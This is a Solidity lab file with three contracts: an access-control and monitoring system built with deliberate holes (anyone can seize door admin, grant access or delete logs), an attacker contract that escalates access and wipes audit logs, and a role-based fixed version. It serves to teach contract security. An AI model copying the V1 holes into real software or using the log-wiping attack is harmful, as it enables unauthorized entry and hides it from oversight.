// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ELECTRONIC ACCESS CONTROL AND MONITORING SYSTEM – SMART CONTRACT LAB
 *
 *  This single file contains:
 *
 *   1) ElectronicAccessControlAndMonitoringSystemV1
 *        – vulnerable door/user access manager & monitoring logs
 *
 *   2) ElectronicAccessControlAndMonitoringSystemAttacker
 *        – attacker that escalates access and wipes logs
 *
 *   3) ElectronicAccessControlAndMonitoringSystemV2Defense
 *        – secure, role-based access control with immutable logs
 *
 *  Concept:
 *    - Doors / zones are protected by an electronic access system.
 *    - Users can be granted access to doors.
 *    - Access attempts are logged as events.
 *
 *    V1 BUGS:
 *      - Anyone can:
 *          * mark themselves as door admin
 *          * grant access rights to any user on any door
 *          * open any door programmatically
 *          * delete log entries
 *
 *    V2 FIXES:
 *      - Roles: ADMIN, SECURITY_OFFICER, USER
 *      - Only ADMIN can assign roles and create doors.
 *      - Only ADMIN/SECURITY_OFFICER can grant/revoke access.
 *      - Logs are immutable (no delete, no overwrite).
 *      - Door open checks require valid permission.
 */


/* ============================================================= */
/* 1. VULNERABLE ELECTRONIC ACCESS CONTROL & MONITORING (V1)     */
/* ============================================================= */

contract ElectronicAccessControlAndMonitoringSystemV1 {
    struct Door {
        string label;
        address doorAdmin;    // supposed admin, but not enforced
        bool exists;
    }

    struct AccessLog {
        uint256 doorId;
        address user;
        bool granted;         // whether access was allowed
        uint64 timestamp;
        bool exists;
    }

    uint256 public doorCounter;
    uint256 public logCounter;

    // doorId => Door
    mapping(uint256 => Door) public doors;

    // doorId => user => hasAccess
    mapping(uint256 => mapping(address => bool)) public accessRights;

    // logId => AccessLog
    mapping(uint256 => AccessLog) public logs;

    event DoorCreated(uint256 indexed doorId, string label, address doorAdmin);
    event DoorAdminChanged(uint256 indexed doorId, address newAdmin);
    event AccessGranted(uint256 indexed doorId, address indexed user);
    event AccessRevoked(uint256 indexed doorId, address indexed user);
    event DoorOpened(uint256 indexed doorId, address indexed user, bool granted);
    event LogDeleted(uint256 indexed logId);

    /*
     *  ⚠️ VULNERABILITIES:
     *    - createDoor: anyone can create doors, set themselves admin
     *    - setDoorAdmin: no access control; anyone can take over
     *    - grantAccess / revokeAccess: no admin check; anyone can grant themselves access
     *    - openDoor: trusts accessRights which anyone can change
     *    - deleteLog: anyone can delete any log entry (no audit integrity)
     */

    function createDoor(string memory label) external returns (uint256) {
        require(bytes(label).length > 0, "label required");

        doorCounter++;
        uint256 id = doorCounter;

        doors[id] = Door({
            label: label,
            doorAdmin: msg.sender,
            exists: true
        });

        emit DoorCreated(id, label, msg.sender);
        return id;
    }

    // ⚠️ anyone can hijack admin
    function setDoorAdmin(uint256 doorId, address newAdmin) external {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        d.doorAdmin = newAdmin;
        emit DoorAdminChanged(doorId, newAdmin);
    }

    // ⚠️ anyone can grant themselves or others access
    function grantAccess(uint256 doorId, address user) external {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        accessRights[doorId][user] = true;
        emit AccessGranted(doorId, user);
    }

    // ⚠️ anyone can revoke others' access
    function revokeAccess(uint256 doorId, address user) external {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        accessRights[doorId][user] = false;
        emit AccessRevoked(doorId, user);
    }

    // open door and log it
    function openDoor(uint256 doorId) external {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");

        bool granted = accessRights[doorId][msg.sender];

        logCounter++;
        uint256 logId = logCounter;

        logs[logId] = AccessLog({
            doorId: doorId,
            user: msg.sender,
            granted: granted,
            timestamp: uint64(block.timestamp),
            exists: true
        });

        emit DoorOpened(doorId, msg.sender, granted);
        // In a real system, granted would actually control hardware.
    }

    // ⚠️ anyone can erase logs
    function deleteLog(uint256 logId) external {
        require(logs[logId].exists, "log missing");
        delete logs[logId];
        emit LogDeleted(logId);
    }

    function getDoor(uint256 doorId)
        external
        view
        returns (
            string memory label,
            address doorAdmin,
            bool exists
        )
    {
        Door storage d = doors[doorId];
        return (d.label, d.doorAdmin, d.exists);
    }

    function getLog(uint256 logId)
        external
        view
        returns (
            uint256 doorId,
            address user,
            bool granted,
            uint64 timestamp,
            bool exists
        )
    {
        AccessLog storage l = logs[logId];
        return (l.doorId, l.user, l.granted, l.timestamp, l.exists);
    }
}


/* ============================================================= */
/*     2. ATTACKER – ESCALATE ACCESS & WIPE MONITORING LOGS      */
/* ============================================================= */

contract ElectronicAccessControlAndMonitoringSystemAttacker {
    ElectronicAccessControlAndMonitoringSystemV1 public target;
    address public attacker;

    event DoorHijacked(uint256 indexed doorId);
    event AccessEscalated(uint256 indexed doorId, address indexed user);
    event LogsWiped(uint256[] logIds);

    constructor(address _target) {
        target = ElectronicAccessControlAndMonitoringSystemV1(_target);
        attacker = msg.sender;
    }

    /*
     * Attack pattern:
     *  - For a door with real-world hardware behind it:
     *      1) Call setDoorAdmin and make yourself admin.
     *      2) Call grantAccess for yourself (or colluders).
     *      3) Call openDoor to simulate entry.
     *      4) Call deleteLog to wipe traces.
     */

    function hijackDoorAndGrant(uint256 doorId) external {
        require(msg.sender == attacker, "not attacker");

        // Step 1: take admin role
        target.setDoorAdmin(doorId, address(this));
        emit DoorHijacked(doorId);

        // Step 2: grant self access
        target.grantAccess(doorId, attacker);
        emit AccessEscalated(doorId, attacker);
    }

    function openHijackedDoor(uint256 doorId) external {
        require(msg.sender == attacker, "not attacker");
        target.openDoor(doorId);
    }

    function wipeLogs(uint256[] calldata logIds) external {
        require(msg.sender == attacker, "not attacker");

        for (uint256 i = 0; i < logIds.length; i++) {
            // any failures will revert whole tx if log doesn't exist
            target.deleteLog(logIds[i]);
        }

        emit LogsWiped(logIds);
    }
}


/* ============================================================= */
/* 3. SECURE ELECTRONIC ACCESS CONTROL & MONITORING (V2 DEFENSE) */
/* ============================================================= */

contract ElectronicAccessControlAndMonitoringSystemV2Defense {
    enum Role {
        NONE,
        USER,
        SECURITY_OFFICER,
        ADMIN
    }

    struct Door {
        string label;
        bool exists;
        uint64 createdAt;
        uint64 updatedAt;
    }

    struct AccessLog {
        uint256 doorId;
        address user;
        bool granted;
        uint64 timestamp;
        bool exists;
    }

    address public systemAdmin;
    uint256 public doorCounter;
    uint256 public logCounter;

    // roles
    mapping(address => Role) public roles;

    // doors
    mapping(uint256 => Door) public doors;

    // permissions: doorId -> user -> hasAccess
    mapping(uint256 => mapping(address => bool)) public accessRights;

    // logs
    mapping(uint256 => AccessLog) public logs;

    event RoleAssigned(address indexed account, Role role);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);

    event DoorCreated(uint256 indexed doorId, string label, address indexed by);
    event DoorUpdated(uint256 indexed doorId, string label, address indexed by);

    event AccessGranted(uint256 indexed doorId, address indexed user, address indexed by);
    event AccessRevoked(uint256 indexed doorId, address indexed user, address indexed by);

    event DoorOpened(uint256 indexed doorId, address indexed user, bool granted, uint256 logId);

    modifier onlyAdmin() {
        require(roles[msg.sender] == Role.ADMIN, "not admin");
        _;
    }

    modifier onlyOfficerOrAdmin() {
        Role r = roles[msg.sender];
        require(
            r == Role.SECURITY_OFFICER || r == Role.ADMIN,
            "not officer/admin"
        );
        _;
    }

    constructor() {
        systemAdmin = msg.sender;
        roles[msg.sender] = Role.ADMIN;
        emit RoleAssigned(msg.sender, Role.ADMIN);
    }

    // ------------- ROLE MANAGEMENT -------------

    function assignRole(address account, Role role) external onlyAdmin {
        require(account != address(0), "zero");
        require(role != Role.NONE, "invalid role");
        roles[account] = role;
        emit RoleAssigned(account, role);
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "zero");
        address old = systemAdmin;
        systemAdmin = newAdmin;
        roles[newAdmin] = Role.ADMIN;
        emit AdminChanged(old, newAdmin);
    }

    // ------------- DOOR MANAGEMENT -------------

    function createDoor(string memory label) external onlyAdmin returns (uint256) {
        require(bytes(label).length > 0, "label required");

        doorCounter++;
        uint256 id = doorCounter;

        doors[id] = Door({
            label: label,
            exists: true,
            createdAt: uint64(block.timestamp),
            updatedAt: uint64(block.timestamp)
        });

        emit DoorCreated(id, label, msg.sender);
        return id;
    }

    function updateDoor(uint256 doorId, string memory newLabel) external onlyAdmin {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        require(bytes(newLabel).length > 0, "label required");

        d.label = newLabel;
        d.updatedAt = uint64(block.timestamp);

        emit DoorUpdated(doorId, newLabel, msg.sender);
    }

    // ------------- PERMISSION MANAGEMENT -------------

    function grantAccess(uint256 doorId, address user) external onlyOfficerOrAdmin {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        require(user != address(0), "zero user");

        accessRights[doorId][user] = true;
        emit AccessGranted(doorId, user, msg.sender);
    }

    function revokeAccess(uint256 doorId, address user) external onlyOfficerOrAdmin {
        Door storage d = doors[doorId];
        require(d.exists, "door missing");
        require(user != address(0), "zero user");

        accessRights[doorId][user] = false;
        emit AccessRevoked(doorId, user, msg.sender);
    }

    // ------------- DOOR OPEN + LOGGING -------------

    /*
     *  Secure semantics:
     *    - Anyone with ROLE.USER (or higher) can attempt to open a door.
     *    - Access is only granted if accessRights[doorId][msg.sender] is true.
     *    - An immutable log record is created for every attempt.
     *    - NO delete function exists for logs.
     */

    function openDoor(uint256 doorId) external {
        require(doors[doorId].exists, "door missing");
        require(roles[msg.sender] != Role.NONE, "unregistered user");

        bool granted = accessRights[doorId][msg.sender];

        logCounter++;
        uint256 logId = logCounter;

        logs[logId] = AccessLog({
            doorId: doorId,
            user: msg.sender,
            granted: granted,
            timestamp: uint64(block.timestamp),
            exists: true
        });

        emit DoorOpened(doorId, msg.sender, granted, logId);

        // Hardware integration would use "granted" off-chain to actually unlock the door.
    }

    // ------------- VIEW HELPERS -------------

    function getDoor(uint256 doorId)
        external
        view
        returns (
            string memory label,
            bool exists,
            uint64 createdAt,
            uint64 updatedAt
        )
    {
        Door storage d = doors[doorId];
        return (d.label, d.exists, d.createdAt, d.updatedAt);
    }

    function getLog(uint256 logId)
        external
        view
        returns (
            uint256 doorId,
            address user,
            bool granted,
            uint64 timestamp,
            bool exists
        )
    {
        AccessLog storage l = logs[logId];
        return (l.doorId, l.user, l.granted, l.timestamp, l.exists);
    }
}
